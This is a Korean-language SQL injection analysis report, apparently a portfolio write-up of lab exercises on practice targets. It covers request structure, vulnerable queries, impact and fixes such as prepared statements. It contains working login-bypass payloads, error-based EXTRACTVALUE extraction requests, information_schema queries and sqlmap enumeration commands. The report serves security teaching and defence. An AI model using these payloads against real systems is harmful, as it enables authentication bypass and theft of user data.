# 취약점 분석 보고서 - SQL Injection

## 1. 개요

대상 웹 애플리케이션의 로그인 기능과 게시글 조회 기능에서 SQL Injection 가능성을 분석했다. 로그인 기능에서는 인증 우회 가능성을, 게시글 조회 기능에서는 Error-Based SQLi를 통한 DB 정보 노출 가능성을 중심으로 검증했다.

이 보고서는 OWASP Juice Shop, The Cod Caper, PHP/MySQL 실습에서 반복적으로 사용한 SQLi 분석 루틴을 포트폴리오 제출용 보고서 형식으로 재구성한 것이다.

## 2. 대상 / 환경

| 항목 | 내용 |
| --- | --- |
| 대상 | 실습용 웹 애플리케이션 |
| 주요 기능 | 로그인, 게시글 조회, 조회수 증가 |
| 취약 유형 | Login Bypass SQLi, Error-Based SQLi |
| 주요 파라미터 | `username`, `password`, `id` |
| DBMS | MySQL 계열 실습 환경 |
| 검증 도구 | Burp Suite Repeater, Browser DevTools, sqlmap |

## 3. 분석 목적

- 로그인 요청 구조를 확인하고 인증 우회 가능성을 검증한다.
- 숫자형 파라미터가 SQL 쿼리에 직접 삽입되는지 확인한다.
- DB 에러 메시지를 통해 데이터베이스 정보가 노출되는지 확인한다.
- Prepared Statement 적용 전후의 차이를 정리한다.

## 4. 입력 지점 분석

### 4.1 로그인 요청

Burp Suite로 로그인 요청을 확인했을 때 사용자 입력이 `username`, `password` 값으로 전달됐다.

```http
POST /login
Content-Type: application/json

{
  "username": "<user_input>",
  "password": "<user_input>"
}
```

취약한 구현에서는 입력값이 문자열 연결 방식으로 SQL 쿼리에 삽입된다.

```sql
SELECT * FROM users
WHERE username = '<username>'
AND password = '<password>';
```

이 구조에서는 username에 SQL 주석과 항상 참인 조건을 삽입해 password 검사를 무력화할 수 있다.

```text
' OR '1'='1'--
admin'--
```

### 4.2 게시글 조회 / 조회수 증가

게시글 상세 페이지의 `id` 파라미터는 숫자처럼 보이지만, 서버에서 그대로 SQL에 삽입되면 Injection 지점이 된다.

```text
GET /board/view.php?id=1
```

예상되는 취약 쿼리:

```sql
UPDATE posts SET views = views + 1 WHERE id = <id>;
SELECT * FROM posts WHERE id = <id>;
```

조회수 증가처럼 보조 기능에 있는 쿼리도 사용자 입력을 포함하면 SQLi 대상이 된다.

## 5. 취약점 원리

SQL Injection은 사용자 입력이 SQL 문법의 일부로 해석될 때 발생한다. 애플리케이션은 입력값을 데이터로만 다뤄야 하지만, 문자열 연결 방식으로 쿼리를 만들면 공격자가 따옴표, 논리 연산자, 주석, 함수 호출을 이용해 쿼리 구조를 바꿀 수 있다.

### 5.1 Login Bypass

```sql
-- 정상 의도
SELECT * FROM users
WHERE username = 'admin'
AND password = 'wrong-password';

-- Injection 후
SELECT * FROM users
WHERE username = 'admin'--'
AND password = 'wrong-password';
```

주석 뒤의 password 조건이 무시되면 비밀번호 검증이 우회될 수 있다.

### 5.2 Error-Based SQLi

MySQL의 `EXTRACTVALUE()` 또는 `UPDATEXML()` 함수는 XPath 오류 메시지에 쿼리 결과 일부를 포함할 수 있다. 에러가 사용자 화면에 노출되는 경우 DB 버전, DB명, 테이블명, 컬럼명 추출로 이어진다.

```sql
1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))
```

예시 응답:

```text
XPATH syntax error: '~app_database'
```

## 6. 재현 절차

### 6.1 로그인 SQLi 수동 확인

```text
1. 정상 계정/임의 계정으로 로그인 요청 구조를 확인한다.
2. username에 작은따옴표를 넣어 에러 또는 응답 차이를 확인한다.
3. ' OR '1'='1'-- 계열 payload로 인증 우회 여부를 확인한다.
4. 특정 계정 식별자가 알려진 경우 admin'-- 형태로 password 조건 제거 가능성을 확인한다.
```

### 6.2 Error-Based SQLi 확인

```bash
curl "http://target.local/board/view.php?id=1'"
curl "http://target.local/board/view.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))"
curl "http://target.local/board/view.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))"
```

테이블과 컬럼 추출은 `information_schema`를 통해 단계적으로 확인한다.

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = database()
LIMIT 0,1;
```

### 6.3 자동화 도구는 보조로 사용

The Cod Caper 실습에서는 수동으로 SQLi 가능성을 먼저 확인한 뒤 sqlmap으로 DB 구조 추출을 자동화했다.

![The Cod Caper administrator login form](assets/reports/thm-cod-caper/01-admin-login.jpg)

이 캡처는 단순한 로그인 화면이 아니라 SQLi 검증의 입력 지점이다. 보고서에서는 “로그인 기능이 있다”가 아니라 `username`, `password`가 어떤 HTTP 요청으로 전달되고, 서버가 그 값을 SQL 조건식에 어떻게 반영하는지부터 확인한다.

```bash
sqlmap -u "http://target.local/administrator.php" --forms
sqlmap -u "http://target.local/administrator.php" --data "username=&password=" --dbs
sqlmap -u "http://target.local/administrator.php" --data "username=&password=" -D users --tables
```

![sqlmap database enumeration result](assets/reports/thm-cod-caper/02-sqlmap-dbs.jpg)

sqlmap 결과는 취약점의 “출발점”이 아니라 수동 분석 이후의 보조 증거로 사용했다. 즉, 먼저 요청 구조와 응답 차이를 확인하고, 그 다음 DB 열람 가능성을 구조적으로 검증했다.

보고서에는 도구 실행 결과보다 “어떤 요청이 취약했고, 왜 취약했으며, 어떤 영향이 있는지”를 우선 기록한다.

## 7. 영향도

| 구분 | 영향 |
| --- | --- |
| 인증 | 비밀번호 없이 관리자 또는 일반 사용자로 로그인 가능 |
| 기밀성 | 사용자 계정, 비밀번호 해시, 개인정보, 게시글 데이터 추출 가능 |
| 무결성 | 조건에 따라 데이터 수정/삭제 가능 |
| 가용성 | 무거운 쿼리 실행 또는 데이터 훼손으로 서비스 장애 가능 |
| 위험도 | 인증 없이 원격으로 악용 가능하면 Critical로 평가 가능 |

## 8. 대응 방안

### 8.1 Prepared Statement 적용

```php
$stmt = $pdo->prepare(
    'SELECT * FROM users WHERE username = ? AND password_hash = ?'
);
$stmt->execute([$username, $passwordHash]);
```

숫자형 파라미터도 문자열 연결 대신 바인딩한다.

```php
$stmt = $pdo->prepare('SELECT * FROM posts WHERE id = ?');
$stmt->execute([(int) $id]);
```

### 8.2 에러 메시지 숨김

```ini
display_errors = Off
log_errors = On
```

DB 에러는 서버 로그에만 남기고 사용자에게는 일반 오류 메시지를 반환한다. 단, 에러 숨김은 근본 해결책이 아니므로 Prepared Statement와 함께 적용해야 한다.

### 8.3 비밀번호 저장 방식 개선

```php
$hash = password_hash($password, PASSWORD_DEFAULT);
password_verify($inputPassword, $hash);
```

로그인 SQLi가 발생하면 비밀번호 해시가 노출될 수 있으므로 단방향 해시와 salt가 포함된 안전한 저장 방식이 필요하다.

## 9. 학습한 점

- SQLi는 로그인 폼뿐 아니라 조회수 증가, 검색, 정렬, 필터 같은 보조 기능에서도 발생할 수 있다.
- sqlmap은 빠른 확인에 유용하지만, 보고서 품질은 수동 분석으로 요청 구조와 취약 쿼리를 설명할 때 높아진다.
- Error-Based SQLi는 에러 메시지 노출과 결합될 때 데이터 추출 속도가 빨라진다.
- Prepared Statement는 필터링보다 안정적인 근본 대응책이다.
